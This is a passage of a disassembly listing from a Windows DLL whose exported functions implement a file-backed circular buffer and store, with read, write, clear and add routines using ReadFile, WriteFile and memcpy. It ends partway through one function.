Ordinal421	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+24h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal421	endp

; Exported entry 422.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal422
Ordinal422	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+4]
		call	Ordinal236
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal422	endp

; Exported entry 423.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal423
Ordinal423	proc near		; CODE XREF: Ordinal418+25p
					; Ordinal419+25p ...

NumberOfBytesWritten= dword ptr	-4
Dst		= dword	ptr  8
hFile		= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		xor	edx, edx
		cmp	[esi+14h], edx
		jnz	short loc_6AF3BBF9
		push	offset aCcircularbuf_0 ; "CCircularBuffer::ReadEx() : m_pBufferBe"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3BD1C
; ---------------------------------------------------------------------------

loc_6AF3BBF9:				; CODE XREF: Ordinal423+Cj
		push	edi		; Args
		mov	edi, [ebp+nNumberOfBytesToWrite]
		cmp	[esi+24h], edi
		jnb	short loc_6AF3BC14
		push	offset aCcircularbuf_1 ; "CCircularBuffer::ReadEx() : m_nDataSize"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3BD1B
; ---------------------------------------------------------------------------

loc_6AF3BC14:				; CODE XREF: Ordinal423+27j
		mov	ecx, [esi+1Ch]
		mov	eax, [esi+18h]
		push	ebx
		lea	ebx, [ecx+edi]
		cmp	ebx, eax
		mov	[ebp+NumberOfBytesWritten], edx
		ja	short loc_6AF3BC89
		cmp	[ebp+Dst], edx
		jz	short loc_6AF3BC39
		push	edi		; Size
		push	ecx		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch
		xor	edx, edx

loc_6AF3BC39:				; CODE XREF: Ordinal423+4Fj
		cmp	[ebp+hFile], edx
		jz	short loc_6AF3BC75
		push	edx		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	edi		; nNumberOfBytesToWrite
		push	dword ptr [esi+1Ch] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:WriteFile
		test	eax, eax
		jz	short loc_6AF3BC59
		cmp	[ebp+NumberOfBytesWritten], edi
		jz	short loc_6AF3BC73

loc_6AF3BC59:				; CODE XREF: Ordinal423+79j
					; Ordinal423+E1j ...
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCcircularbuf_2 ; "CCircularBuffer::ReadEx() : WriteFile()"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3BD1A
; ---------------------------------------------------------------------------

loc_6AF3BC73:				; CODE XREF: Ordinal423+7Ej
		xor	edx, edx

loc_6AF3BC75:				; CODE XREF: Ordinal423+63j
		cmp	[ebp+arg_C], edx
		jz	loc_6AF3BD17
		add	[esi+1Ch], edi
		sub	[esi+24h], edi
		jmp	loc_6AF3BD17
; ---------------------------------------------------------------------------

loc_6AF3BC89:				; CODE XREF: Ordinal423+4Aj
		sub	eax, ecx
		cmp	[ebp+Dst], edx
		mov	ebx, eax
		jz	short loc_6AF3BCA1
		push	ebx		; Size
		push	ecx		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch
		xor	edx, edx

loc_6AF3BCA1:				; CODE XREF: Ordinal423+B7j
		cmp	[ebp+hFile], edx
		jz	short loc_6AF3BCC1
		push	edx		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	ebx		; nNumberOfBytesToWrite
		push	dword ptr [esi+1Ch] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:WriteFile
		test	eax, eax
		jz	short loc_6AF3BC59
		cmp	[ebp+NumberOfBytesWritten], ebx
		jnz	short loc_6AF3BC59

loc_6AF3BCC1:				; CODE XREF: Ordinal423+CBj
		mov	eax, [ebp+Dst]
		sub	edi, ebx
		test	eax, eax
		jz	short loc_6AF3BCD9
		push	edi		; Size
		push	dword ptr [esi+14h] ; Src
		add	ebx, eax
		push	ebx		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF3BCD9:				; CODE XREF: Ordinal423+EFj
		cmp	[ebp+hFile], 0
		jz	short loc_6AF3BD03
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	edi		; nNumberOfBytesToWrite
		push	dword ptr [esi+14h] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:WriteFile
		test	eax, eax
		jz	loc_6AF3BC59
		cmp	[ebp+NumberOfBytesWritten], edi
		jnz	loc_6AF3BC59

loc_6AF3BD03:				; CODE XREF: Ordinal423+104j
		cmp	[ebp+arg_C], 0
		jz	short loc_6AF3BD17
		mov	eax, [esi+14h]
		add	eax, edi
		mov	[esi+1Ch], eax
		mov	eax, [ebp+nNumberOfBytesToWrite]
		sub	[esi+24h], eax

loc_6AF3BD17:				; CODE XREF: Ordinal423+9Fj
					; Ordinal423+ABj ...
		xor	eax, eax
		inc	eax

loc_6AF3BD1A:				; CODE XREF: Ordinal423+95j
		pop	ebx

loc_6AF3BD1B:				; CODE XREF: Ordinal423+36j
		pop	edi

loc_6AF3BD1C:				; CODE XREF: Ordinal423+1Bj
		pop	esi
		leave
		retn	10h
Ordinal423	endp

; Exported entry 424.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal424
Ordinal424	proc near		; CODE XREF: Ordinal416+23p
					; Ordinal417+23p
					; DATA XREF: ...

NumberOfBytesRead= dword ptr -4
Src		= dword	ptr  8
hFile		= dword	ptr  0Ch
nNumberOfBytesToRead= dword ptr	 10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		cmp	[esi+14h], ebx
		jnz	short loc_6AF3BD42
		push	offset aCcircularbuf_3 ; "CCircularBuffer::WriteEx() : m_pBufferB"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3BE53
; ---------------------------------------------------------------------------

loc_6AF3BD42:				; CODE XREF: Ordinal424+Dj
		push	edi		; Args
		lea	ecx, [esi+4]
		call	Ordinal236
		mov	ecx, [esi+24h]
		mov	edi, [ebp+nNumberOfBytesToRead]
		add	ecx, edi
		cmp	ecx, eax
		jbe	short loc_6AF3BD69
		push	offset aCcircularbuf_4 ; "CCircularBuffer::WriteEx() : m_nDataSiz"...
		call	sub_6AF3102E

loc_6AF3BD61:				; CODE XREF: Ordinal424+11Bj
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3BE52
; ---------------------------------------------------------------------------

loc_6AF3BD69:				; CODE XREF: Ordinal424+34j
		mov	ecx, [esi+20h]
		mov	eax, [esi+18h]
		lea	edx, [ecx+edi]
		cmp	edx, eax
		mov	[ebp+NumberOfBytesRead], ebx
		ja	short loc_6AF3BDB7
		cmp	[ebp+Src], ebx
		jz	short loc_6AF3BD8B
		push	edi		; Size
		push	[ebp+Src]	; Src
		push	ecx		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF3BD8B:				; CODE XREF: Ordinal424+5Bj
		cmp	[ebp+hFile], ebx
		jz	short loc_6AF3BDAF
		push	ebx		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesRead
		push	edi		; nNumberOfBytesToRead
		push	dword ptr [esi+20h] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:ReadFile
		test	eax, eax
		jz	loc_6AF3BE2A
		cmp	[ebp+NumberOfBytesRead], edi
		jnz	short loc_6AF3BE2A

loc_6AF3BDAF:				; CODE XREF: Ordinal424+6Dj
		add	[esi+20h], edi
		jmp	loc_6AF3BE4C
; ---------------------------------------------------------------------------

loc_6AF3BDB7:				; CODE XREF: Ordinal424+56j
		sub	eax, ecx
		cmp	[ebp+Src], 0
		mov	ebx, eax
		jz	short loc_6AF3BDCE
		push	ebx		; Size
		push	[ebp+Src]	; Src
		push	ecx		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF3BDCE:				; CODE XREF: Ordinal424+9Ej
		cmp	[ebp+hFile], 0
		jz	short loc_6AF3BDF0
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesRead
		push	ebx		; nNumberOfBytesToRead
		push	dword ptr [esi+20h] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:ReadFile
		test	eax, eax
		jz	short loc_6AF3BE2A
		cmp	[ebp+NumberOfBytesRead], ebx
		jnz	short loc_6AF3BE2A

loc_6AF3BDF0:				; CODE XREF: Ordinal424+B1j
		mov	eax, [ebp+Src]
		sub	edi, ebx
		test	eax, eax
		jz	short loc_6AF3BE08
		push	edi		; Size
		add	ebx, eax
		push	ebx		; Src
		push	dword ptr [esi+14h] ; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF3BE08:				; CODE XREF: Ordinal424+D6j
		cmp	[ebp+hFile], 0
		jz	short loc_6AF3BE41
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesRead
		push	edi		; nNumberOfBytesToRead
		push	dword ptr [esi+14h] ; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:ReadFile
		test	eax, eax
		jz	short loc_6AF3BE2A
		cmp	[ebp+NumberOfBytesRead], edi
		jz	short loc_6AF3BE41

loc_6AF3BE2A:				; CODE XREF: Ordinal424+83j
					; Ordinal424+8Cj ...
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCcircularbuf_5 ; "CCircularBuffer::WriteEx() : ReadFile()"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF3BD61
; ---------------------------------------------------------------------------

loc_6AF3BE41:				; CODE XREF: Ordinal424+EBj
					; Ordinal424+107j
		mov	eax, [esi+14h]
		add	eax, edi
		mov	edi, [ebp+nNumberOfBytesToRead]
		mov	[esi+20h], eax

loc_6AF3BE4C:				; CODE XREF: Ordinal424+91j
		add	[esi+24h], edi
		xor	eax, eax
		inc	eax

loc_6AF3BE52:				; CODE XREF: Ordinal424+43j
		pop	edi

loc_6AF3BE53:				; CODE XREF: Ordinal424+1Cj
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal424	endp

; Exported entry 412.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal412
Ordinal412	proc near		; CODE XREF: sub_6AF3BF9B+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF58608
		call	Ordinal414
		lea	ecx, [esi+28h]
		call	Ordinal1279
		lea	ecx, [esi+4]
		pop	esi
		jmp	Ordinal863
Ordinal412	endp

; Exported entry 416.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal416
Ordinal416	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	[ebp+arg_4]
		mov	ecx, esi
		push	0
		push	[ebp+arg_0]
		call	Ordinal424
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal416	endp

; Exported entry 417.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal417
Ordinal417	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	[ebp+arg_4]
		mov	ecx, esi
		push	[ebp+arg_0]
		push	0
		call	Ordinal424
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal417	endp

; Exported entry 418.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal418
Ordinal418	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	1
		push	[ebp+arg_4]
		mov	ecx, esi
		push	0
		push	[ebp+arg_0]
		call	Ordinal423
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal418	endp

; Exported entry 419.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal419
Ordinal419	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	1
		push	[ebp+arg_4]
		mov	ecx, esi
		push	[ebp+arg_0]
		push	0
		call	Ordinal423
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal419	endp

; Exported entry 420.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal420
Ordinal420	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	0
		push	[ebp+arg_4]
		mov	ecx, esi
		push	0
		push	[ebp+arg_0]
		call	Ordinal423
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal420	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3BF9B(void *, char)
sub_6AF3BF9B	proc near		; DATA XREF: .rdata:off_6AF58608o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal412
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3BFB1
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3BFB1:				; CODE XREF: sub_6AF3BF9B+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3BF9B	endp

; Exported entry 425.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal425
Ordinal425	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		push	esi
		push	[esp+4+arg_C]
		mov	esi, ecx
		push	[esp+8+arg_8]
		push	[esp+0Ch+arg_4]
		push	[esp+10h+arg_0]
		call	Ordinal584
		xor	eax, eax
		push	10h		; Size
		push	eax		; Val
		mov	[esi+0B8h], eax
		mov	[esi+0BCh], eax
		lea	eax, [esi+0C0h]
		push	eax		; Dst
		mov	dword ptr [esi], offset	off_6AF587A8
		call	memset
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	10h
Ordinal425	endp

; Exported entry 429.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal429
Ordinal429	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	edi, [esi+0B8h]
		mov	esi, [esi+0BCh]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		mov	edx, esi
		pop	esi
		leave
		retn
Ordinal429	endp

; Exported entry 434.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal434
Ordinal434	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		retn	0Ch
Ordinal434	endp

; Exported entry 435.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal435
Ordinal435	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		retn	8
Ordinal435	endp

; Exported entry 436.
; Exported entry 437.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal437
Ordinal437	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax	; ccL30_436
		retn	4
Ordinal437	endp

; Exported entry 438.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal438(int,	LPCVOID	lpBuffer, DWORD	nNumberOfBytesToWrite)
		public Ordinal438
Ordinal438	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
lpBuffer	= dword	ptr  8
nNumberOfBytesToWrite= dword ptr  0Ch

		push	[esp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		mov	eax, [esp+4+arg_0]
		push	[esp+4+lpBuffer] ; lpBuffer
		add	eax, 10h
		push	eax		; int
		call	Ordinal595
		retn	0Ch
Ordinal438	endp

; Exported entry 439.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal439(int,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
		public Ordinal439
Ordinal439	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
lpBuffer	= dword	ptr  8
nNumberOfBytesToRead= dword ptr	 0Ch

		push	[esp+nNumberOfBytesToRead] ; nNumberOfBytesToRead
		mov	eax, [esp+4+arg_0]
		push	[esp+4+lpBuffer] ; lpBuffer
		add	eax, 10h
		push	eax		; int
		call	Ordinal596
		retn	0Ch
Ordinal439	endp

; Exported entry 440.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal440
Ordinal440	proc near		; DATA XREF: .rdata:off_6AF66098o
		call	Ordinal599
		sub	eax, 10h
		retn
Ordinal440	endp

; Exported entry 442.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal442(LPCVOID lpBuffer)
		public Ordinal442
Ordinal442	proc near		; CODE XREF: Ordinal431+35p
					; Ordinal432+40p ...

lpBuffer	= dword	ptr  4

		push	10h		; nNumberOfBytesToWrite
		push	[esp+4+lpBuffer] ; lpBuffer
		push	0		; int
		call	Ordinal595
		test	eax, eax
		jnz	short loc_6AF3C09C
		push	offset aCcircularstore ; "CCircularStore::WriteOffset()	: WriteHe"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF3C09F
; ---------------------------------------------------------------------------

loc_6AF3C09C:				; CODE XREF: Ordinal442+Fj
		xor	eax, eax
		inc	eax

locret_6AF3C09F:			; CODE XREF: Ordinal442+1Ej
		retn	4
Ordinal442	endp

; Exported entry 443.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal443(void	*lpBuffer)
		public Ordinal443
Ordinal443	proc near		; CODE XREF: Ordinal441+1Fp
					; Ordinal427+44p
					; DATA XREF: ...

lpBuffer	= dword	ptr  4

		push	esi
		push	10h		; Size
		push	0		; Val
		push	[esp+0Ch+lpBuffer] ; Dst
		mov	esi, ecx
		call	memset
		add	esp, 0Ch
		push	10h		; nNumberOfBytesToRead
		push	[esp+8+lpBuffer] ; lpBuffer
		mov	ecx, esi
		push	0		; int
		call	Ordinal596
		test	eax, eax
		pop	esi
		jnz	short loc_6AF3C0D8
		push	offset aCcircularsto_0 ; "CCircularStore::ReadOffset() : ReadHead"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF3C0DB
; ---------------------------------------------------------------------------

loc_6AF3C0D8:				; CODE XREF: Ordinal443+25j
		xor	eax, eax
		inc	eax

locret_6AF3C0DB:			; CODE XREF: Ordinal443+34j
		retn	4
Ordinal443	endp

; Exported entry 431.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal431
Ordinal431	proc near		; CODE XREF: Ordinal426+9p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		xor	edi, edi
		lea	ecx, [esi+8]
		inc	edi
		call	Ordinal1137
		test	eax, eax
		jz	short loc_6AF3C129
		lea	eax, [esi+0C0h]
		push	eax		; lpBuffer
		mov	ecx, esi
		call	Ordinal442
		test	eax, eax
		jnz	short loc_6AF3C129
		push	offset aCcircularsto_1 ; "CCircularStore::Close() : WriteOffset()"...
		call	sub_6AF3102E
		pop	ecx
		xor	edi, edi

loc_6AF3C129:				; CODE XREF: Ordinal431+2Aj
					; Ordinal431+3Cj
		mov	ecx, esi
		call	Ordinal588
		test	eax, eax
		jnz	short loc_6AF3C141
		push	offset aCcircularsto_2 ; "CCircularStore::Close() : CDataStore::C"...
		call	sub_6AF3102E
		pop	ecx
		xor	edi, edi

loc_6AF3C141:				; CODE XREF: Ordinal431+54j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn
Ordinal431	endp

; Exported entry 432.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal432
Ordinal432	proc near		; CODE XREF: Ordinal430+8Fp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, [esi+20h]
		lea	eax, [esi+0C0h]
		and	dword ptr [eax+4], 0
		add	ecx, 20h
		mov	[eax], ecx
		mov	[esi+0C8h], ecx
		mov	ecx, [eax+4]
		mov	[esi+0CCh], ecx
		push	eax		; lpBuffer
		mov	ecx, esi
		call	Ordinal442
		test	eax, eax
		jnz	short loc_6AF3C1A7
		push	offset aCcircularsto_3 ; "CCircularStore::Clear() : WriteOffset()"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3C1B0
; ---------------------------------------------------------------------------

loc_6AF3C1A7:				; CODE XREF: Ordinal432+47j
		mov	ecx, esi
		call	Ordinal589
		mov	esi, eax

loc_6AF3C1B0:				; CODE XREF: Ordinal432+56j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal432	endp

; Exported entry 433.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal433(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, int)
		public Ordinal433
Ordinal433	proc near		; DATA XREF: .rdata:off_6AF66098o

var_98		= byte ptr -98h
var_80		= dword	ptr -80h
Buffer		= byte ptr -70h
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_48		= byte ptr -48h
var_3C		= dword	ptr -3Ch
lDistanceToMove	= dword	ptr -38h
var_34		= dword	ptr -34h
Dst		= byte ptr -30h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lpBuffer	= dword	ptr  8
nNumberOfBytesToWrite= dword ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 98h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_48]
		call	Ordinal1228
		mov	eax, [ebp+arg_8]
		mov	[eax], ebx
		mov	[eax+4], ebx
		mov	eax, [ebp+nNumberOfBytesToWrite]
		cmp	eax, ebx
		jz	loc_6AF3C518
		cmp	[ebp+lpBuffer],	ebx
		jz	loc_6AF3C518
		mov	edi, [esi+0B8h]
		mov	ecx, [esi+0BCh]
		mov	edx, edi
		or	edx, ecx
		jz	short loc_6AF3C22A
		mov	edx, [esi+20h]
		lea	eax, [edx+eax+20h]
		xor	edx, edx
		cmp	edx, ecx
		jb	short loc_6AF3C22A
		ja	short loc_6AF3C220
		cmp	eax, edi
		jbe	short loc_6AF3C22A

loc_6AF3C220:				; CODE XREF: Ordinal433+5Dj
		push	offset aCcircularsto_4 ; "CCircularStore::Add()	: dwSize + sizeof"...
		jmp	loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C22A:				; CODE XREF: Ordinal433+4Ej
					; Ordinal433+5Bj ...
		lea	eax, [ebp+var_8]
		lea	edi, [esi+8]
		push	eax
		mov	ecx, edi
		mov	[ebp+var_8], ebx
		mov	[ebp+var_4], ebx
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF3C256
		mov	ecx, edi
		call	Ordinal236
		mov	[esi+14h], eax
		push	offset aCcircularsto_5 ; "CCircularStore::Add()	: m_File.GetLengt"...
		jmp	loc_6AF3C51D
; ---------------------------------------------------------------------------

loc_6AF3C256:				; CODE XREF: Ordinal433+83j
		mov	edx, [esi+0BCh]
		lea	eax, [esi+0C0h]
		mov	edi, [eax]
		mov	ebx, [eax+4]
		mov	eax, [esi+0C8h]
		mov	[ebp+lDistanceToMove], eax
		mov	eax, [esi+0CCh]
		mov	[ebp+var_34], eax
		mov	eax, [esi+0B8h]
		or	eax, edx
		jz	short loc_6AF3C2C0
		mov	ecx, [ebp+nNumberOfBytesToWrite]
		xor	eax, eax
		add	ecx, edi
		adc	eax, ebx
		add	ecx, 28h
		adc	eax, 0
		cmp	eax, edx
		jb	short loc_6AF3C2C0
		ja	short loc_6AF3C2A0
		cmp	ecx, [esi+0B8h]
		jbe	short loc_6AF3C2C0

loc_6AF3C2A0:				; CODE XREF: Ordinal433+D9j
		push	ebx		; int
		push	edi		; lDistanceToMove
		lea	ecx, [esi+8]
		call	Ordinal789
		test	eax, eax
		jz	loc_6AF3C445
		mov	[ebp+var_8], edi
		mov	edi, [esi+20h]
		mov	[ebp+var_4], ebx
		add	edi, 20h
		xor	ebx, ebx

loc_6AF3C2C0:				; CODE XREF: Ordinal433+C4j
					; Ordinal433+D7j ...
		push	28h		; Size
		lea	eax, [ebp+Dst]
		push	0		; Val
		push	eax		; Dst
		call	memset
		mov	ecx, [ebp+var_8]
		add	esp, 0Ch
		cmp	edi, ecx
		jnz	short loc_6AF3C2E9
		mov	eax, [ebp+var_4]
		cmp	ebx, eax
		jnz	short loc_6AF3C2E9
		mov	[ebp+var_28], ecx
		mov	[ebp+var_24], eax
		jmp	loc_6AF3C3FC
; ---------------------------------------------------------------------------

loc_6AF3C2E9:				; CODE XREF: Ordinal433+118j
					; Ordinal433+11Fj
		lea	eax, [ebp+Dst]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	ebx		; int
		push	edi		; lDistanceToMove
		mov	ecx, esi
		call	Ordinal611
		test	eax, eax
		jz	loc_6AF3C44F
		and	[ebp+var_3C], 0
		jmp	short loc_6AF3C35F
; ---------------------------------------------------------------------------

loc_6AF3C308:				; CODE XREF: Ordinal433+21Dj
		cmp	[ebp+var_3C], 0
		jnz	short loc_6AF3C38D
		cmp	[ebp+var_34], ebx
		ja	short loc_6AF3C38D
		jb	short loc_6AF3C31A
		cmp	[ebp+lDistanceToMove], edi
		jnb	short loc_6AF3C38D

loc_6AF3C31A:				; CODE XREF: Ordinal433+156j
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	[ebp+var_34]	; int
		mov	ecx, esi
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		call	Ordinal611
		test	eax, eax
		jz	loc_6AF3C44F
		mov	eax, [ebp+var_58]
		mov	edx, [ebp+var_54]
		cmp	eax, edx
		mov	[ebp+var_3C], 1
